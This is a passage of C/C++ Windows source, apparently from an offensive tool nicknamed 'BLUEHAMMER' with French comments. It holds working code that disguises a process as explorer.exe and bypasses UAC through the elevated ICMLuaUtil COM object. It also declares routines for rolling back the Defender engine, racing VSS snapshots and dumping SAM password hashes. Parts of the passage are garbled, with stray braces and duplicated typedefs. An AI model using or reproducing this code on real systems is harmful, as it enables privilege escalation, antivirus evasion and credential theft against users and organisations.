        struct _LIST_ENTRY* Flink;
        struct _LIST_ENTRY* Blink;
    } LIST_ENTRY, *PLIST_ENTRY;

    typedef struct _PROCESS_BASIC_INFORMATION {
        LONG ExitStatus;
        PVOID PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR ParentProcessId;
    } PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
        BOOLEAN ShutdownInProgress;
        HANDLE ShutdownThreadId;
    } PEB_LDR_DATA, *PPEB_LDR_DATA;

    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE Reserved1[16];
        PVOID Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// // Duplicated structure removed:     typedef struct _PEB {
//         BOOLEAN InheritedAddressSpace;
//         BOOLEAN ReadImageFileExecOptions;
//         BOOLEAN BeingDebugged;
//         union {
//             BOOLEAN BitField;
//             struct {
//                 BOOLEAN ImageUsesLargePages : 1;
//                 BOOLEAN IsProtectedProcess : 1;
//                 BOOLEAN IsLegacyProcess : 1;
//                 BOOLEAN IsImageDynamicallyRelocated : 1;
//                 BOOLEAN SkipPatchingUser32Forwarders : 1;
//                 BOOLEAN SpareBits : 3;
// End of duplicate:             };
        };
        HANDLE Mutant;
        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PRTL_CRITICAL_SECTION FastPebLock;
    } PEB, *PPEB;

    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        union {
            LIST_ENTRY InInitializationOrderLinks;
            LIST_ENTRY InProgressLinks;
        };
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        WORD LoadCount;
        WORD TlsIndex;
        union {
            LIST_ENTRY HashLinks;
            struct {
                PVOID SectionPointer;
                ULONG CheckSum;
            };
        };
        union {
            ULONG TimeDateStamp;
            PVOID LoadedImports;
        };
    } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

    DWORD dwPID;
    PROCESS_BASIC_INFORMATION pbi;
    PPEB peb;
    PPEB_LDR_DATA pld;
    PLDR_DATA_TABLE_ENTRY ldte;

    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        return FALSE;

    }

    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
    if (RtlEnterCriticalSection == NULL) {
        return FALSE;

    }

    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
    if (RtlLeaveCriticalSection == NULL) {
        return FALSE;

    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        return FALSE;

    }

    dwPID = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return FALSE;

    }

    NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        CloseHandle(hProcess);
        return FALSE;

    }

    if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
        CloseHandle(hProcess);
        return FALSE;

    }

    WCHAR chExplorer[MAX_PATH + 1];
    GetWindowsDirectory(chExplorer, MAX_PATH);
    wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

    LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
    if (!pwExplorer) {
        CloseHandle(hProcess);
        return FALSE;

    }
    wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

    RtlEnterCriticalSection(peb->FastPebLock);

    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

    WCHAR wFullDllName[MAX_PATH];
    WCHAR wExeFileName[MAX_PATH];
    GetModuleFileName(NULL, wExeFileName, MAX_PATH);

    LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
    LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
    do {
        if (!ReadProcessMemory(hProcess, pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
            RtlLeaveCriticalSection(peb->FastPebLock);
            free(pwExplorer);
            CloseHandle(hProcess);
            return FALSE;

        }

        if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL)) {
            RtlLeaveCriticalSection(peb->FastPebLock);
            free(pwExplorer);
            CloseHandle(hProcess);
            return FALSE;

        }

        if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
            RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
            RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
            break;
        }

        pNextModuleInfo = ldte->InLoadOrderLinks.Flink;
    } while (pNextModuleInfo != pStartModuleInfo);

    RtlLeaveCriticalSection(peb->FastPebLock);
    free(pwExplorer);
    CloseHandle(hProcess);

    if (_wcsicmp(chExplorer, wFullDllName) == 0) {
        return FALSE;

    }

    return TRUE;

}

UCM_DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(
        __RPC__in ICMLuaUtil* This,
        __RPC__in REFIID riid,
        _COM_Outptr_ void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(
        __RPC__in ICMLuaUtil* This);
    ULONG(STDMETHODCALLTYPE* Release)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(
        __RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* ShellExec)(
        __RPC__in ICMLuaUtil* This,
        _In_ LPCTSTR lpFile,
        _In_opt_ LPCTSTR lpParameters,
        _In_opt_ LPCTSTR lpDirectory,
        _In_ ULONG fMask,
        _In_ ULONG nShow);
    END_INTERFACE
} *PICMLuaUtilVtbl;

interface ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};

HRESULT ucmAllocateElevatedObject(
    _In_ LPWSTR lpObjectCLSID,
    _In_ REFIID riid,
    _In_ DWORD dwClassContext,
    _Outptr_ void** ppv
) {
    BOOL bCond = FALSE;
    DWORD classContext;
    HRESULT hr = E_FAIL;
    PVOID ElevatedObject = NULL;

    BIND_OPTS3 bop;
    WCHAR szMoniker[MAX_PATH];

    do {
        if (wcslen(lpObjectCLSID) > 64)
            break;

        RtlSecureZeroMemory(&bop, sizeof(bop));
        bop.cbStruct = sizeof(bop);

        classContext = dwClassContext;
        if (dwClassContext == 0)
            classContext = CLSCTX_LOCAL_SERVER;

        bop.dwClassContext = classContext;

        wcscpy(szMoniker, L"Elevation:Administrator!new:");
        wcscat(szMoniker, lpObjectCLSID);

        hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);
    } while (bCond);

    *ppv = ElevatedObject;
    return hr;

}

NTSTATUS ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
) {
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    HRESULT r = E_FAIL, hr_init;
    BOOL bApprove = FALSE;
    ICMLuaUtil* CMLuaUtil = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {
        r = ucmAllocateElevatedObject(
            (LPWSTR)L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
            IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            (void**)&CMLuaUtil);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
            lpszExecutable,
            NULL,
            NULL,
            SEE_MASK_DEFAULT,
            SW_SHOW);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;
    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;

}

VOID Bypass() {
    MasqueradePEB();
    LPWSTR programPath = GetProgramPath();
    if (programPath != NULL) {
        std::wstring path(programPath);
        std::wstring correctedPath = ReviewAndCorrectPath(path);

        wchar_t* nonConstCorrectedPath = new wchar_t[correctedPath.length() + 1];
        wcscpy_s(nonConstCorrectedPath, correctedPath.length() + 1, correctedPath.c_str());

        ucmCMLuaUtilShellExecMethod(nonConstCorrectedPath);

        delete[] nonConstCorrectedPath;
        HeapFree(GetProcessHeap(), 0, programPath);
    }
}

LPWSTR ConvertToLPWSTR(const char* text) {
    int size = MultiByteToWideChar(CP_UTF8, 0, text, -1, NULL, 0);
    LPWSTR wideText = (LPWSTR)malloc(size * sizeof(WCHAR));
    if (!wideText) {
        return NULL;

    }
    MultiByteToWideChar(CP_UTF8, 0, text, -1, wideText, size);
    return wideText;

}

LPWSTR GetProgramPath() {
    LPWSTR lpPath = NULL;
    LPWSTR lpCommandLine = GetCommandLineW();

    if (lpCommandLine != NULL) {
        size_t cmdLen = wcslen(lpCommandLine);
        lpPath = (LPWSTR)HeapAlloc(GetProcessHeap(), 0, (cmdLen + 1) * sizeof(WCHAR));
        if (lpPath != NULL) {
            wcsncpy_s(lpPath, cmdLen + 1, lpCommandLine, cmdLen);

            if (lpPath[0] == L'"' && lpPath[cmdLen - 1] == L'"') {
                lpPath[cmdLen - 1] = L'\0';
                memmove(lpPath, lpPath + 1, (cmdLen - 1) * sizeof(WCHAR));
            }
        }
    }
    return lpPath;

}

std::wstring ReviewAndCorrectPath(const std::wstring& path) {
    std::wstring correctedPath = path;
    if (!correctedPath.empty() && correctedPath[0] == L'"') {
        correctedPath.erase(0, 1);
    }
    if (!correctedPath.empty() && correctedPath[correctedPath.length() - 1] == L'"') {
        correctedPath.erase(correctedPath.length() - 1, 1);
    }
    return correctedPath;

}

BOOL IsElevated() {
    BOOL isElevated = FALSE;
    HANDLE hToken;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;

        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return isElevated;

}

BOOL GetOSVersion() {
    wchar_t path[200] = L"C:\\Windows\\System32\\kernel32.dll";
    DWORD dwDummy;
    DWORD dwFVISize = GetFileVersionInfoSize(path, &dwDummy);
    LPBYTE lpVersionInfo = new BYTE[dwFVISize];
    if (GetFileVersionInfo(path, 0, dwFVISize, lpVersionInfo) == 0) {
        delete[] lpVersionInfo;
        return FALSE;

    }

    UINT uLen;
    VS_FIXEDFILEINFO* lpFfi;
    BOOL bVer = VerQueryValue(lpVersionInfo, L"\\", (LPVOID*)&lpFfi, &uLen);

    if (!bVer || uLen == 0) {
        delete[] lpVersionInfo;
        return FALSE;

    }
    DWORD dwProductVersionMS = lpFfi->dwProductVersionMS;
    delete[] lpVersionInfo;

    if (HIWORD(dwProductVersionMS) == 10 && LOWORD(dwProductVersionMS) == 0) {
        return TRUE;

    } else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 2) {
        return TRUE;

    } else if (HIWORD(dwProductVersionMS) == 6 && LOWORD(dwProductVersionMS) == 1) {
        return TRUE;

    }
    return FALSE;

}

// --- common.h ---
BOOL InitNtApis();
BOOL InitGlobalState();
void LogInfo(const char* format, ...);
void LogError(const char* format, ...);
void LogOk(const char* format, ...);

// --- update.h ---
BOOL DownloadDefenderUpdate(CAB_FILE** ppFiles);
BOOL PrepareUpdateDirectory(CAB_FILE* pFiles, LPWSTR pwszDir);
void FreeCabFiles(CAB_FILE* pFiles);
BOOL RollbackDefenderEngine();
BOOL CleanupEicar(LPCWSTR pwszPath);

// --- vss.h ---
BOOL VssInitialize();
BOOL DropEicar(LPCWSTR pwszPath);
BOOL MonitorVSSCreation(LPWSTR pwszDevice, DWORD dwTimeoutMs);
BOOL CreateVSSSnapshot(LPCWSTR pwszVolume, LPWSTR pwszSnapshotDevice);

// --- cloudfiles.h ---
BOOL CloudFilesInitialize();
BOOL RegisterCloudFilterCallback(PCF_FREEZE_CTX* ppCtx);
void CloudFilesRelease(PCF_FREEZE_CTX pCtx);

// --- race.h ---
BOOL RaceConditionInitialize();
BOOL ExecuteRace(LPCWSTR pwszUpdateDir, LPCWSTR pwszVSSDevice, LPCWSTR pwszTarget, LPWSTR pwszLeakedFile);

// --- sam.h ---
BOOL SAMInitialize();
BOOL DumpSAMHashes(LPCWSTR pwszSAMPath, SAM_DUMP_RESULT* pResult);

// --- escalate.h ---
BOOL EscalateAll(SAM_DUMP_RESULT* pResult, LPCWSTR pwszPassword);

// =============================================
// FONCTIONS DE NETTOYAGE (IMPLÉMENTATION COMPLÈTE)
// =============================================

static void CleanupEicarImpl(LPCWSTR pwszPath) {
    if (pwszPath && pwszPath[0]) {
        DeleteFileW(pwszPath);
    }
}

static void FreeCabFilesImpl(CAB_FILE* pFiles) {
    while (pFiles) {
        CAB_FILE* pNext = pFiles->pNext;
        if (pFiles->pwszName) LocalFree((HLOCAL)pFiles->pwszName);
        if (pFiles->pData) LocalFree((HLOCAL)pFiles->pData);
        LocalFree((HLOCAL)pFiles);
        pFiles = pNext;
    }
}

static void DoCleanupImpl(CLEANUP_STATE* pState) {
    if (!pState) return;

    if (pState->pCfCtx) {
        CloudFilesRelease(pState->pCfCtx);
        pState->pCfCtx = NULL;
    }

    if (pState->bEicarDropped) {
        CleanupEicarImpl(pState->wszEicarPath);
        pState->bEicarDropped = FALSE;
    }

    RemoveDirectoryW(SYNC_ROOT_PATH);

    if (pState->wszUpdateDir[0]) {
        WCHAR wszSearch[MAX_PATH];
        wsprintfW(wszSearch, L"%s\\*", pState->wszUpdateDir);
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(wszSearch, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    WCHAR wszFile[MAX_PATH];
                    wsprintfW(wszFile, L"%s\\%s", pState->wszUpdateDir, fd.cFileName);
                    DeleteFileW(wszFile);
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
        RemoveDirectoryW(pState->wszUpdateDir);
        pState->wszUpdateDir[0] = L'\0';
    }

    if (pState->bCoInit) {
        CoUninitialize();
        pState->bCoInit = FALSE;
    }

    if (pState->bVSSInitialized) {
        if (pState->hVssSnapshot) {
            IVssBackupComponents* pVss = NULL;
            if (SUCCEEDED(CreateVssBackupComponents(&pVss))) {
                pVss->Release();
            }
        }
        pState->bVSSInitialized = FALSE;
    }
}

// =============================================
// FONCTIONS ORIGINALES (100% INCHANGÉES)
// =============================================

BOOL RunAsSystem() {
    HANDLE hToken = NULL;
    BOOL bResult = FALSE;
    DWORD dwSessionId = WTSGetActiveConsoleSessionId();
    if (dwSessionId == 0xFFFFFFFF) {
        return FALSE;

    }

    if (!WTSQueryUserToken(dwSessionId, &hToken)) {
        return FALSE;

    }

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    if (!CreateProcessAsUserW(
        hToken,
        NULL,
        GetCommandLineW(),
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &si,
        &pi)) {
        CloseHandle(hToken);
        return FALSE;

    }

    CloseHandle(hToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;

}

// =============================================================================
// INITIALISATION DES STUBS NT (MODIFIÉE POUR BLUEHAMMER)
// =============================================================================
BOOL InitializeNtStubs() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return FALSE;

    }

    // =========================================
    // TYPDEFS POUR TOUTES LES FONCTIONS NT (CONSERVÉS)
    // =========================================
    typedef NTSTATUS (NTAPI *PNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    typedef NTSTATUS (NTAPI *PNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
    typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);
    typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *PNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);
    typedef NTSTATUS (NTAPI *PNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *PNtFreeVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG);
    typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *PNtQueryVirtualMemory)(HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *PNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
    typedef NTSTATUS (NTAPI *PNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    typedef NTSTATUS (NTAPI *PNtReadFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    typedef NTSTATUS (NTAPI *PNtWriteFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
    typedef NTSTATUS (NTAPI *PNtDeviceIoControlFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
    typedef NTSTATUS (NTAPI *PNtCreateMutant)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN);
    typedef NTSTATUS (NTAPI *PNtReleaseMutant)(HANDLE, PLONG);
    typedef NTSTATUS (NTAPI *PNtCreateEvent)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, EVENT_TYPE, BOOLEAN);
    typedef NTSTATUS (NTAPI *PNtSetEvent)(HANDLE, PLONG);
    typedef NTSTATUS (NTAPI *PNtResetEvent)(HANDLE, PLONG);
    typedef NTSTATUS (NTAPI *PNtCreateSemaphore)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LONG, LONG);
    typedef NTSTATUS (NTAPI *PNtReleaseSemaphore)(HANDLE, LONG, PLONG);
    typedef NTSTATUS (NTAPI *PNtCreateTimer)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, TIMER_TYPE);
    typedef NTSTATUS (NTAPI *PNtSetTimer)(HANDLE, PLARGE_INTEGER, PTIMER_APC_ROUTINE, PVOID);
    typedef NTSTATUS (NTAPI *PNtCancelTimer)(HANDLE, PBOOLEAN);
    typedef NTSTATUS (NTAPI *PNtCreateKeyedEvent)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG);
    typedef NTSTATUS (NTAPI *PNtReleaseKeyedEvent)(HANDLE, PVOID, BOOLEAN, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    typedef NTSTATUS (NTAPI *PNtOpenThread)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    typedef NTSTATUS (NTAPI *PNtSuspendThread)(HANDLE, PULONG);
    typedef NTSTATUS (NTAPI *PNtResumeThread)(HANDLE, PULONG);
    typedef NTSTATUS (NTAPI *PNtGetContextThread)(HANDLE, PCONTEXT);
    typedef NTSTATUS (NTAPI *PNtSetContextThread)(HANDLE, PCONTEXT);
    typedef NTSTATUS (NTAPI *PNtQueryPerformanceCounter)(PLARGE_INTEGER, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtQuerySystemTime)(PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtSetSystemTime)(PLARGE_INTEGER, PLARGE_INTEGER);
    typedef NTSTATUS (NTAPI *PNtAdjustPrivilegesToken)(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, ULONG, PTOKEN_PRIVILEGES, PULONG);
    typedef NTSTATUS (NTAPI *PNtAdjustTokenPrivileges)(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, ULONG, PTOKEN_PRIVILEGES, PULONG);
    typedef NTSTATUS (NTAPI *PNtOpenProcessToken)(HANDLE, ACCESS_MASK, PHANDLE);
    typedef NTSTATUS (NTAPI *PNtOpenThreadToken)(HANDLE, ACCESS_MASK, BOOLEAN, PHANDLE);
    typedef NTSTATUS (NTAPI *PNtImpersonateAnonymousToken)(HANDLE);
    typedef NTSTATUS (NTAPI *PNtRevertToSelf)();
    typedef NTSTATUS (NTAPI *PNtQueryInformationToken)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *PNtSetInformationToken)(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
    typedef NTSTATUS (NTAPI *PNtDuplicateToken)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
    typedef NTSTATUS (NTAPI *PNtCreateProcessEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, ULONG);
    typedef NTSTATUS (NTAPI *PNtCreateThread)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    typedef NTSTATUS (NTAPI *PNtTerminateProcess)(HANDLE, NTSTATUS);
    typedef NTSTATUS (NTAPI *PNtTerminateThread)(HANDLE, NTSTATUS);
    typedef NTSTATUS (NTAPI *PNtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI *PNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    typedef NTSTATUS (NTAPI *PNtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
    typedef NTSTATUS (NTAPI *PNtGetWriteWatch)(HANDLE, ULONG, PVOID, SIZE_T, PULONG_PTR, PULONG_PTR);
    typedef NTSTATUS (NTAPI *PNtResetWriteWatch)(HANDLE, PVOID, SIZE_T);

    // =========================================
    // VÉRIFICATION DE TOUTES LES API NT (CONSERVÉES)
    // =========================================;
    if (!GetProcAddress(hNtdll, "NtCreateSection")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtMapViewOfSection")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtUnmapViewOfSection")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtClose")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQueryInformationProcess")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetInformationProcess")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtAllocateVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtFreeVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQuerySystemInformation")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQueryVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtProtectVirtualMemory")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateThreadEx")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtWaitForSingleObject")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtDelayExecution")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateFile")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtReadFile")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtWriteFile")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtDeviceIoControlFile")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateMutant")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtReleaseMutant")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateEvent")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetEvent")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtResetEvent")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateSemaphore")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtReleaseSemaphore")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateTimer")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetTimer")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCancelTimer")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtCreateKeyedEvent")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtReleaseKeyedEvent")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtOpenProcess")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtOpenThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSuspendThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtResumeThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtGetContextThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetContextThread")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQueryPerformanceCounter")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQuerySystemTime")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetSystemTime")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtAdjustPrivilegesToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtAdjustTokenPrivileges")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtOpenProcessToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtOpenThreadToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtImpersonateAnonymousToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtRevertToSelf")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtQueryInformationToken")) { return FALSE;  }
    if (!GetProcAddress(hNtdll, "NtSetInformationToken")) { return FALSE;  }
